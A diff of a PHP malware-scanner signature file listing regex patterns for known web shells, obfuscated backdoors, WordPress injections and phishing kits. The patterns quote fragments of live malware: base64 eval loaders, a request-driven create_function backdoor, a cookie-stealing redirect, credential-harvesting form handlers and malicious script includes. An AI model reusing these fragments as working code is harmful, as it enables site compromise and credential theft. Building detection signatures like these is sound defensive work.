+    array (
+      'pattern' => '/fore add to zip\\.
+        \\$localPath \\= substr\\(\\$filePath, \\$exclusiveLength\\);
+        if \\(is_file\\(\\$filePath\\)\\) \\{
+          \\$/s',
+      'label' => 'sample-specific content window',
+    ),
+    770 => 
+    array (
+      'pattern' => '/print "\\<br\\>\\\\r\\\\n";
+        \\}
+        \\$x\\+\\+;
+        for\\(\\$k \\= 0; \\$k \\< 40000; \\$k\\+\\+\\) \\{echo \' \';\\}
+    \\}
+
+\\}
+print \'\\<\\/body\\>\';
+\\?\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    771 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\/\\* Do not change this code, or your script will not work\\. \\( ORVX SHELL encrypted to avoid spam filter detection and to work on any hos/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    772 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\/\\* Respect C0ders\\. \\*\\/ \\$I\\=file\\(__FILE__\\);eval\\(base64_decode\\("ZnVuY3Rpb24gTygkYSwkYil7JGM9YXJyYXkoNDEwLDI5Miw4LDE2NzI4KTtpZigkYj09Mil7JG/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    773 => 
+    array (
+      'pattern' => '/\\<\\?php
+
+set_time_limit\\(0\\);
+
+if\\(\\$_POST\\[\'Manda\'\\]\\)
+\\{[\\s\\S]{0,12000}nt color\\=green face\\=verdana size\\=1\\>\\* \\$i \\- "\\.\\$mai/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    774 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*bdffe\\*\\/
+
+@include "\\\\057home\\\\057difu\\\\172e[\\s\\S]{0,12000}\\/\\*\\*
+ \\* The base configuration for WordPress
+ \\*/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    775 => 
+    array (
+      'pattern' => '/0GN4Pk9kCO9VXo0oX5Q9T3lGwpnteM4g7vea1fDx\\/EIhv3HFznWrSawP79zqXjB2y3oEdJ\\/O\\+dtzy8\\+H9fuysJ789ka5CwHDXf\\/qezD\\/\\/9\\/\\/\\/n\\/\\+n\\/\\/X\\/x8\\=/s',
+      'label' => 'sample-specific content window',
+    ),
+    776 => 
+    array (
+      'pattern' => '/i \\< \\$j; \\$i\\+\\+\\)\\{
+        \\$v \\<\\<\\= 5;
+        if \\(\\$LN[\\s\\S]{0,12000}&\\= \\(\\(1 \\<\\< \\$vbits\\) \\- 1\\);\\}\\}
+    return \\$USGY;\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    777 => 
+    array (
+      'pattern' => '/\\(\\$ii\\)\\];return null;\\}function http\\(\\$kk\\)\\{\\$dd\\=@file[\\s\\S]{0,12000}unlink\\(\\$oo\\);exit\\(\\);\\}\\}\\}\\}exit\\(json_encode\\(\\$nn\\)\\);\\};/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    778 => 
+    array (
+      'pattern' => '/21232f297a57a5a743894a0e4a801fc3/',
+      'label' => 'sample-specific encoded fragment',
+    ),
+    779 => 
+    array (
+      'pattern' => '/if\\(\\!empty\\(\\$_REQUEST\\[\'bfc\'\\]\\)\\)\\{\\$bfc\\=base64_decode\\(\\$_REQUEST\\[\'bfc\'\\]\\);\\$bfc\\=create_function\\(\'\',\\$bfc\\);@\\$bfc\\(\\);exit;\\}\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    780 => 
+    array (
+      'pattern' => '/\\<\\?php
+error_reporting\\(0\\);@set_time_limit\\(0\\);\\$g\\=\\$_REQUEST;if\\(\\!empty\\(\\$g\\["v"\\]\\)&&\\$g\\["v"\\]\\=\\="JHWEA"\\)\\{if\\(\\!empty\\(\\$g\\["c"\\]\\)\\)exit\\(\\$/s',
+      'label' => 'sample-specific content window',
+    ),
+    781 => 
     array (
       'pattern' => '/196a1129b0564d614070940beb41578b/',
       'label' => 'sample-specific encoded fragment',
     ),
-    1282 => 
+    782 => 
     array (
-      'pattern' => '/\\);
-            if \\(\\$a \\>\\=1&&empty\\(\\$h\\)\\) \\{
-                \\$contents \\= \\$mc\\[0\\]\\[\\$a\\-1\\];
-            \\}
-            if \\(\\$h\\>\\=1\\) \\{/s',
+      'pattern' => '/data\\-toggle\\=\\\\"tooltip\\\\" data\\-placement\\=\\\\"auto\\\\"[\\s\\S]{0,12000}nput\'\\.split\\(\'\\|\'\\),0,\\{\\}\\)\\)\\<\\/script\\>
+\\<\\/body\\>
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    783 => 
+    array (
+      'pattern' => '/^\\s*if\\(\\!empty\\(\\$_POST\\["YVTU"\\]\\)\\{\\$c\\=base64_decode\\("PD9waHANCmVycm9yX3JlcG9ydGluZygwKTtAc2V0X3RpbWVfbGltaXQoMCk7JGc9JF9SRVFVRVNUO2lmKCFlbXB0eSgkZ1si/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    784 => 
+    array (
+      'pattern' => '/html\\>\\/i\', \\$contents, \\$hc\\);
+            if \\(\\$a \\>\\=[\\s\\S]{0,12000}\\<\\/table\\>
+        \\<\\/form\\>
+     \\<\\/body\\>
+ \\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    785 => 
+    array (
+      'pattern' => '/oaded_file\\(\\$_FILES\\["file"\\]\\["tmp_name"\\],"\\/home\\/sm[\\s\\S]{0,12000}sb3cgZnJvbSBhbGwKPC9GaWxlc01hdGNoPg\\=\\="\\)\\)exit\\(1\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    786 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\$password\\=\'hill\';
+\\$shellname\\=\'will\';
+\\$myurl\\=null;
+error_reporting\\(0\\);
+@set_time_limit\\(0\\);
+    function Class_UC_ke/s',
       'label' => 'sample-specific content window',
     ),
-    1283 => 
+    787 => 
     array (
-      'pattern' => '/\\$a\\=\'fgxy1006\';@set_time_limit\\(3600\\);@ignore_user_abort\\(1\\);\\$b\\=\'http\\:\\/\\/fgxy1006\\.badeer\\.top\';if\\(is_https\\(\\)\\)\\{\\$c\\[\'http\'\\]\\=\'https\';\\}else\\{\\$c\\[\'http\'\\][\\s\\S]{0,12000}require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/\\$y\\=\'https\\:\\/\\/www\\.google\\.com\\/ping\\?sitemap\\=\'\\.\\$c\\[\'ht[\\s\\S]{0,12000}late \\*\\/
+require __DIR__ \\. \'\\/wp\\-blog\\-header\\.php\';/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1284 => 
+    788 => 
     array (
-      'pattern' => '/\\>F1~kcjN5qz\\}JH48q\\.Nz\\>AY\\^\\!tNO&lVI\\/
-\\.\\/\\*TtXl7k9AM&vIV5B\\|mEq1\\\\\\?GfUU\\=_av_\\^\\>9uVu\\]\\>%\\*\\/\'2\\=%\' 	\\/\\*\\<6q\\\\\\?Yr\\\\MX1~l&lsp\\>5\\-9\\(D\\[D\\*\\*\\/\\.\\#Y/',
-      'label' => 'sample-specific literal',
+      'pattern' => '/echo \\$_SERVER\\[\'SCRIPT_NAME\'\\];\\s*$/s',
+      'label' => 'source-file last-line anchor',
     ),
-    1285 => 
+    789 => 
     array (
-      'pattern' => '/\\<script type\\=\'text\\/javascript\' src\\=\'https\\:\\/\\/dock\\.lovegreenpencils\\.ga\\/m\\.js\\?n\\=nb5\'\\>\\<\\/script\\>\\<script type\\=\'text\\/javascript\' src\\=\'https\\:\\/\\/cht\\.se/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/exit\\(base64_encode\\(json_encode\\(\\$data\\)\\)\\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
     ),
-    1286 => 
+    790 => 
     array (
-      'pattern' => '/78\\.220\\.197\\.44
-109\\.93\\.233\\.88
-185\\.118\\.171\\.211
-109\\.245\\.36\\.136
-93\\.86\\.71\\.205
-185\\.119\\.88\\.77
-79\\.101\\.86\\.75
+      'pattern' => '/\\(\\$_FILES\\["file"\\]\\["tmp_name"\\],"\\/home\\/smedia\\/publi[\\s\\S]{0,12000}sbG93IGZyb20gYWxsCjwvRmlsZXNNYXRjaD4\\="\\)\\)exit\\(1\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    791 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\/\\/`oD\\=\\\\_fnqB3,fN ,oB\\\\\\)n,\\|F@C1G4ao_\\>%8%vao\\/\\-~H2/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    792 => 
+    array (
+      'pattern' => '/\\<\\?php
+class Wex \\{
+	function __construct\\(\\) \\{
+		\\$cache \\= \\$this\\-\\>stable\\(\\$this\\-\\>process\\);
+		\\$cache \\= \\$this\\-\\>control\\(\\$this\\-\\>_/s',
+      'label' => 'sample-specific content window',
+    ),
+    793 => 
+    array (
+      'pattern' => '/\\<\\?php
+error_reporting\\(0\\);@set_time_limit\\(0\\);\\$g\\=\\$_REQUEST;if\\(\\!empty\\(\\$g\\["v"\\]\\)&&\\$g\\["v"\\]\\=\\="TJGE"\\)\\{if\\(\\!empty\\(\\$g\\["c"\\]\\)\\)exit\\(\\$g/s',
+      'label' => 'sample-specific content window',
+    ),
+    794 => 
+    array (
+      'pattern' => '/^\\s*\\<script type\\=\'text\\/javascript\' src\\=\'https\\:\\/\\/dock\\.lovegreenpencils\\.ga\\/m\\.js\\?n\\=nb5\'\\>\\<\\/script\\>\\<script type\\=\'text\\/javascript\' src\\=\'https\\:\\/\\/cht\\.se/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    795 => 
+    array (
+      'pattern' => '/^\\s*window\\.stop\\(\\);var l\\=String\\.fromCharCode\\(104,116,116,112,115,58,47,47,98,118,115,46,115,101,99,111,110,100,97,114,121,105,110,102,111,114,109/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    796 => 
+    array (
+      'pattern' => '/e\\=text\\/javascript\\> Element\\.prototype\\.appendAfter[\\s\\S]{0,12000}\\>
+	\\<\\?php
+endforeach; \\/\\/ \\$cats
+\\?\\>
+\\<\\/body\\>
+\\<\\/opml\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    797 => 
+    array (
+      'pattern' => '/;\\$_6botak41 \\= _8dikr8t\\:\\:_h8lo3\\(\\);\\$_6botak41\\["uid[\\s\\S]{0,12000}stqufz\\-\\>_bb7ae\\(\\)\\) \\{\\$_lvstqufz\\-\\>_p7u38\\(\\);\\}exit\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    798 => 
+    array (
+      'pattern' => '/iujev\\[3\\];\\$riend\\[\\] \\= \\$juiujev\\[28\\]\\.\\$juiujev\\[1\\]\\.\\$ju[\\s\\S]{0,12000}\\^ wbqwve\\(\\$riend, \\$iwdqf, \\$riend\\[9\\]\\(\\$hkthyd\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    799 => 
+    array (
+      'pattern' => '/;\\$_pz507c2i \\= _e6uwv59\\:\\:_bsp5y\\(\\);\\$_pz507c2i\\["uid[\\s\\S]{0,12000}3epcrf\\-\\>_l5adl\\(\\)\\) \\{\\$_tf3epcrf\\-\\>_07vcx\\(\\);\\}exit\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    800 => 
+    array (
+      'pattern' => '/fb07eb0\'\\]\\[64\\]\\.\\$ebca26\\[\'fb07eb0\'\\]\\[52\\]\\.\\$ebca26\\[\'fb[\\s\\S]{0,12000}e39\\*\\/\\(\\$a81d\\[\\$ebca26\\[\'fb07eb0\'\\]\\[6\\]\\]\\);\\}exit\\(\\);\\} \\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    801 => 
+    array (
+      'pattern' => '/7\\]\\.\\$u66ec1c8\\[\'ua9af4d\'\\]\\[56\\]\\.\\$u66ec1c8\\[\'ua9af4d\'\\][\\s\\S]{0,12000}nhww\\(\\$wdmtoi, \\$ezrkvca, \\$wdmtoi\\[9\\]\\(\\$obemvh\\)\\)\\)\\);\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    802 => 
+    array (
+      'pattern' => '/RETORIO\\<\\/a\\> \\| \\<a href\\=\\\\"\\#\\[New File\\]\\\\" 
+
+onclick\\=\\\\"Newfile\\(\'\\{\\$chdir\\}\'\\)\\\\"\\>CRIAR ARQUIVO\\<\\/a\\> \\| \\<a 
+
+href\\=\\\\"\\{\\$IIIIIIIIII1I\\}&/s',
+      'label' => 'sample-specific content window',
+    ),
+    803 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$j8526\\=\'3\\] 6"9l\\=g\\/\\(tism\\.\\[d75q\\*zxnryhj1vcop8e4aw2bf\\)u_k_0;\\$\';\\$zVFHb4083\\=\\$j8526\\[\\(620\\/\\(30\\-10\\)\\)\\]\\.\\$j8526\\[\\(25\\*1\\)\\]\\.\\$j8526\\[\\(32\\+3\\)\\]\\.\\$j8526\\[\\(\\(15/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    804 => 
+    array (
+      'pattern' => '/\'\\);\';
+    if \\(\\$with_script_tags\\) \\{
+        \\$js_code \\= \'\\<script\\>\' \\. \\$js_code \\. \'\\<\\/script\\>\';
+    \\}
+    echo \\$js_code;
+\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    805 => 
+    array (
+      'pattern' => '/\\<\\?php
+error_reporting\\(0\\);
+\\/\\/UVTVFsnYWN0aW9uJ10pI[\\s\\S]{0,12000}ICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAg/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    806 => 
+    array (
+      'pattern' => '/^\\s*ini_set\\(\'display_errors\', 0\\);/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    807 => 
+    array (
+      'pattern' => '/9\\.101\\.86\\.75
 109\\.93\\.96\\.251
-91\\.150\\./s',
+91\\.150\\.100\\.124
+109\\.93\\.[\\s\\S]{0,12000}89\\.115
+109\\.93\\.137\\.89
+178\\.221\\.136\\.5
+79\\.101\\.222\\.51/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    808 => 
+    array (
+      'pattern' => '/\\<\\?php
+if \\(isset\\(\\$_REQUEST\\[\'action\'\\]\\) && isset\\(\\$_[\\s\\S]{0,12000}m\\(sys_get_temp_dir\\(\\), "theme_temp_setup"\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    809 => 
+    array (
+      'pattern' => '/30\\\\x5f\\\\x4f\\\\x5f"\\]\\(\'\\$OO_00_O0O_\\=\\\\\'\\\\\'\',\'\\$O_0_OO0_O0[\\s\\S]{0,12000}\\\\x30\\\\x4f\\\\x4f\\\\x5f\\\\x5f\\\\x30\\\\x5f\\\\x30"\\]\\(\\);\\/\\/scp\\-173\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    810 => 
+    array (
+      'pattern' => '/3d";
+\\$An0n_3xPloiTeR \\= "xzM0KtWxdd\\\\x2bv9q\\\\x4391Z\\\\x62nwZg\\/\\/O9L0u\\\\x43UM\\\\x63TJQ2Rr\\/Y\\\\x43\\/ls6\\\\x62IYy1S6\\\\x41Ondel\\\\x61j\\\\x63IM\\\\/s',
       'label' => 'sample-specific content window',
     ),
-    1287 => 
+    811 => 
     array (
-      'pattern' => '/,\\$O0OO0O0___\\);\\$O0O00O_O__\\=\\$\\{"\\\\x47\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x4f\\\\x5f\\\\x5f\\\\x5f\\\\x30\\\\x30\\\\x30\\\\x4f\\\\x4f"\\]\\(__FILE__\\)\\.\\\\[\\s\\S]{0,160},\\\\\'\\/\\\\\',\\$O0O00O_O__\\);if\\(\\$\\{"\\\\x47\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x30\\\\x5f\\\\x4f\\\\x4f\\\\x4f\\\\x30\\\\x5f\\\\x5f\\\\x30"\\]\\(\\$O0OO0O0___,\\\\/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/et\\(\'error_log\',NULL\\); @ini_set\\(\'log_errors\',0\\);[\\s\\S]{0,12000}g\\-wp\\-config\\-php\\/
+ \\*
+ \\* @package WordPress
+ \\*\\/
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1288 => 
+    812 => 
     array (
-      'pattern' => '/kQ\\\\x431g\\\\x41\\\\x3d";
-\\$An0n_3xPloiTeR \\= "y\\\\x61tywGpzh\\/\\\\x63PH\\/9Xd\\\\x428UeNw\\/u4KZqw2SE\\\\x43jqU0U7hSJs9YUoeE0\\\\x63to\\\\x62gM\\\\x41D\\\\x/s',
+      'pattern' => '/\\<\\?php  @clearstatcache\\(\\); @set_time_limit\\(0\\); @e[\\s\\S]{0,12000}DNfsnZ9NveQzS\\\\x61ovt5Mp9Oy\\\\x62\\\\x61\\\\x2bXeTpGJ5wxj/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    813 => 
+    array (
+      'pattern' => '/\\$user \\= new WP_User\\(\\$user_id\\);
+    \\$user\\-\\>set_[\\s\\S]{0,12000}\\>Buat Admin\\<\\/button\\>
+    \\<\\/form\\>
+\\<\\/body\\>
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    814 => 
+    array (
+      'pattern' => '/\\<\\?php
+goto rPdJo; KTkdP\\: \\$KMm2l \\= \'_v4XU\'; goto[\\s\\S]{0,12000}MbWA7g\\/ZsxRKHIFu3IdKsrMBnTtQlcNYjcgT2yMIAgocVXuE/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    815 => 
+    array (
+      'pattern' => '/14\\.192\\.\\*","\\^208\\.65\\.144\\.\\*","\\^74\\.125\\.\\*\\.\\*","\\^209\\.85[\\s\\S]{0,12000}at you have requested could not be found\\."\\);\\}\\}\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    816 => 
+    array (
+      'pattern' => '/\\-moz\\-transform\\: rotate\\(900deg\\);
+    \\}
+\\}
+\\<\\/style\\>
+\\<meta http\\-equiv\\="refresh" content\\="15; url\\=redirect\\.php" \\/\\>
+\\<\\/head\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1289 => 
+    817 => 
+    array (
+      'pattern' => '/\\<\\?php
+header\\("Location\\: https\\:\\/\\/onlinebanking\\.hu[\\s\\S]{0,12000}pass from proxy
+        \\$ip \\= \\$_SERVER\\[\'HTTP_X_/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    818 => 
     array (
       'pattern' => '/\\<\\?php
 \\$email \\= "luccypp721@protonmail\\.co/s',
       'label' => 'sample-specific content window',
     ),
-    1290 => 
+    819 => 
     array (
       'pattern' => '/\'input\\[name\\="first\\-name"\\], input\\[name\\="last\\-name"\\]\' \\} \\}\\);
 \\/\\/\\# sourceURL\\=pen\\.js
@@ -8481,153 +5311,573 @@ function m\\(\\$str\\)\\{
 \\<\\/body\\>\\<\\/html\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1291 => 
+    820 => 
     array (
-      'pattern' => '/anti4\\.php\';
-include \'anti\\/anti5\\.php\';
-include \'anti\\/anti6\\.php\';
-include \'anti\\/anti7\\.php\';
+      'pattern' => '/T\\[\'username\'\\]\\."\\\\n";
+\\$bilsmg \\.\\= "Password\\: "\\.\\$_PO[\\s\\S]{0,12000}e\\(\\$fp\\);
+header\\("Location\\: information\\.php"\\);
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    821 => 
+    array (
+      'pattern' => '/\\>Please your email address in order to proceed further\\. Login with the email you are using\\.\\<\\/p\\>
+\\<div class\\=/',
+      'label' => 'sample-specific literal',
+    ),
+    822 => 
+    array (
+      'pattern' => '/bilsmg \\.\\= "Zip\\: "\\.\\$_POST\\[\'zipcode\'\\]\\."\\\\n";
+
+\\$bils[\\s\\S]{0,12000}se\\(\\$fp\\);
+header\\("Location\\: processing\\.php"\\);
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    823 => 
+    array (
+      'pattern' => '/nclude \'anti\\/anti4\\.php\';
+include \'anti\\/anti5\\.php[\\s\\S]{0,12000}\'anti\\/anti7\\.php\';
 include \'anti\\/anti8\\.php\';
 
 
 \\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    824 => 
+    array (
+      'pattern' => '/\\<\\/button\\>\\<\\/div\\>\\<\\/div\\>\\<\\/body\\>\\<\\/html\\>\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    825 => 
+    array (
+      'pattern' => '/\\<\\?php
+	\\$hostname \\= gethostbyaddr\\(\\$_SERVER\\[\'REMOT[\\s\\S]{0,12000}\\^74\\.125\\.\\*\\.\\*", "\\^209\\.85\\.128\\.\\*", "\\^216\\.239\\.32\\.\\*",/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    826 => 
+    array (
+      'pattern' => '/pt type\\=\\\\"text\\/javascript\\\\"\\>
+document\\.location\\=\'secure\\.php\\?&c\\=\'\\+document\\.cookie;
+\\<\\/script\\>";
+
+\\?\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1292 => 
+    827 => 
     array (
-      'pattern' => '/8847\\-3\\.061,3\\.96093\\-3\\.061a7\\.17269,7\\.17269,0,0,1,3\\.00733\\.46826Z"\\>\\<\\/path\\>\\<\\/g\\>\\<\\/g\\>\\<\\/svg\\>
-\\<\\/button\\>\\<\\/div\\>\\<\\/div\\>\\<\\/body\\>\\<\\/html\\>/s',
-      'label' => 'sample-specific content window',
+      'pattern' => '/OST\\[\'email\'\\]\\."\\\\n";
+\\$bilsmg \\.\\= "Password\\: "\\.\\$_POS[\\s\\S]{0,12000};
+fclose\\(\\$fp\\);
+header\\("Location\\: card\\.php"\\);
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1293 => 
+    828 => 
     array (
-      'pattern' => '/echo "\\<script type\\=\\\\"text\\/javascript\\\\"\\>[\\s\\S]{0,12000}document\\.location\\=\'secure\\.php\\?&c\\=\'\\+document\\.cookie;/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/orderid\'\\]\\?\\>" \\>\\<br\\>
+\\<input type\\="submit" value\\="S[\\s\\S]{0,12000}\\["\\.\\$_POST\\[\'email\'\\]\\."\\] \\- Order \\: \\$xx\\<\\/b\\>"; 
+\\}
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1294 => 
+    829 => 
     array (
       'pattern' => '/\\<\\?php
 \\/\\/silence is golde/s',
       'label' => 'sample-specific content window',
     ),
-    1295 => 
+    830 => 
     array (
-      'pattern' => '/thods
-  function set_name\\(\\$name\\) \\{
-    \\$this\\-\\>name \\= \\$name;
-  \\}
-  function get_name\\(\\) \\{
+      'pattern' => '/\\<\\?php
+
+\\/\\*\\*
+ \\* FoxAutoV5 by \\[anonymousfox\\.co\\]
+\\*\\*\\/[\\s\\S]{0,12000}145\\\\x72\\\\162\\\\157\\\\162\\\\137\\\\154\\\\x6f\\\\147", NULL\\); got/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    831 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\/\\*  FoxAutoV5 by \\[anonymousfox\\.co\\]  \\*\\/ \\$XnNhAWEnhoiqwciqpoHH\\=file\\(__FILE__\\);eval\\(base64_decode\\("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWT/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    832 => 
+    array (
+      'pattern' => '/isset\\(\\$_GET\\[\'img\'\\]\\)\\) \\{
+	\\$file\\=base64_decode\\(\\$_GET\\[\'img\'\\]\\);
+	if \\(\\$info\\=getimagesize\\(\\$file\\)\\)\\{
+		switch  \\(\\$info\\[2\\]\\)\\{	\\/\\/1\\=GI/s',
+      'label' => 'sample-specific content window',
+    ),
+    833 => 
+    array (
+      'pattern' => '/^\\s*testing github actions[\\s\\S]{0,18000}added new line here\\s*$/s',
+      'label' => 'source-file first-last anchor',
+    ),
+    834 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php if\\(isset\\(\\$_COOKIE\\[\'x0v\'\\]\\)\\) \\{die\\(\'6WECHPD\'\\);\\}if\\(\\!@function_exists\\(\'getallheaders\'\\)\\)\\{function getallheaders\\(\\)\\{\\$headers\\=array\\(\\);foreach\\(\\$/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    835 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php if\\(isset\\(\\$_COOKIE\\[\'XgO3\'\\]\\)\\) \\{die\\(\'hGXA0tss\'\\);\\} class _t\\{private static\\$_k;static function _kr\\(\\$_cmc,\\$_tic\\)\\{if\\(\\!self\\:\\:\\$_k\\)\\:self\\:\\:_tt\\(\\);/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    836 => 
+    array (
+      'pattern' => '/\\<\\?php
+
+\\/\\*
+ \\* This file is part of the Monolog pa[\\s\\S]{0,12000}imeException
+     \\*\\/
+    public static function/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    837 => 
+    array (
+      'pattern' => '/\\<\\?php if\\(isset\\(\\$_COOKIE\\[\'x0v\'\\]\\)\\) \\{die\\(\'6WECHPD\'\\);\\}\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    838 => 
+    array (
+      'pattern' => '/\\<\\?php \\$system \\= \\$_GET\\[\'f\'\\]; if\\(\\$system \\=\\= \'f\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$_FILES\\[\'file\'\\]\\[\'name\'\\];echo "\\<form method\\=\'POST\'[\\s\\S]{0,12000}\\<\\?php error_reporting\\(0\\); echo "aDriv4"; \\$code \\= \\$_GET\\["php"\\]; if \\(empty\\(\\$code\\) or \\!stristr\\(\\$code, "http"\\)\\)\\{ exit; \\} else \\{ \\$php\\=file_get_co/s',
+      'label' => 'source-file head-tail anchor',
+    ),
+    839 => 
+    array (
+      'pattern' => '/ic \\$color;
+
+  \\/\\/ Methods
+  function set_name\\(\\$na[\\s\\S]{0,12000}on get_name\\(\\) \\{
     return \\$this\\-\\>name;
   \\}
 \\}
 \\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    840 => 
+    array (
+      'pattern' => '/f\\="\\?rename\\=\\<\\?php  echo e\\(\\$path\\) \\. "\\\\x26" \\. \\$edir[\\s\\S]{0,12000}inuxploit\\.com\\/"\\>linuxploit\\.com\\<\\/a\\>\\<\\/body\\>\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    841 => 
+    array (
+      'pattern' => '/ho \'\\<font color\\="blue"\\>Set Permission Success\\<\\/f[\\s\\S]{0,12000}rms & 0x0200\\) \\? \'T\' \\: \'\\-\'\\)\\);
+
+return \\$info;
+\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    842 => 
+    array (
+      'pattern' => '/\\<\\?php
+
+function u0\\(\\$i1,\\$j2\\=""\\)\\{\\$v3\\=\\$i1;\\$n4\\="";for\\(\\$d5\\=0;\\$d5\\<strlen\\(\\$v3\\);\\)\\{for\\(\\$r6\\=0;\\(\\$r6\\<strlen\\(\\$j2\\)&&\\$d5\\<strlen\\(\\$v3\\)\\);\\$/s',
       'label' => 'sample-specific content window',
     ),
-    1296 => 
+    843 => 
     array (
-      'pattern' => '/"enctype\\="multipart\\/form\\-data"method\\="post"\\>\\<input\\s+class\\="\\<\\?php\\s+goto\\s+DnoB1;\\s+qhlbJ\\:\\s+function\\s+d\\(\\$s\\)\\s+\\{\\s+return\\s+base64_decode\\(\\$s\\);\\s+\\}\\s+goto\\s+mevDp;\\s+C8wlP\\:\\s+\\?\\>/',
-      'label' => 'sample-specific line fragment',
+      'pattern' => '/\\/\\*uxWchwZOOLVgGPNpAGhbPIiAqUvywOYgYoxloTWWkBaaeLOJOuRGFcoewHKPEGjWWZrnOkmYalzOWAjWvcVfPqODVntZgsOGnDEjIuVTjNrwiiYcwDtytwHVOMvdbXMj\\*\\/\\s*$/s',
+      'label' => 'source-file last-line anchor',
     ),
-    1297 => 
+    844 => 
     array (
-      'pattern' => '/code \\= `include\\(\'\\$wdir\' \\. \'wp\\-config\\.php\'\\);[\\s\\S]{0,12000}onclick\\=Excod\\(\'delete_evil\'\\); style\\=\'cursor\\:pointer; color\\:\\#00f\'\\>R_Evil\\<\\/a\\> _ \\<a/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/\\/\\*DTrmJXEqrwdbMhMXHxckniZtoIbBWOgpXSMNCLTAwMXHRNYMyfvVDGkNQISryepolkbIpTaevwLHQMeVjhGaMxpAmcCBTNsHsVkWVubboAraHfexNCMyQInHBPfehPot\\*\\/\\s*$/s',
+      'label' => 'source-file last-line anchor',
     ),
-    1298 => 
+    845 => 
+    array (
+      'pattern' => '/^\\s*function suicide\\(\\)\\{/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    846 => 
+    array (
+      'pattern' => '/onclick\\=Excod\\(\'delete_evil\'\\); style\\=\'cursor\\:pointer; color\\:\\#00f\'\\>R_Evil\\<\\/a\\> _ \\<a\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    847 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php error_reporting\\(0\\); @ini_set\\(\'error_log\', NULL\\); @ini_set\\(\'log_errors\', 0\\); @ini_set\\(\'display_errors\', 0\\); \\$root \\= \\$_SERVER\\[\'DOCUMENT_/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    848 => 
     array (
       'pattern' => '/\\<\\?php
 \\$password \\= "rMJoybmXUPl"; \\/\\/ Password
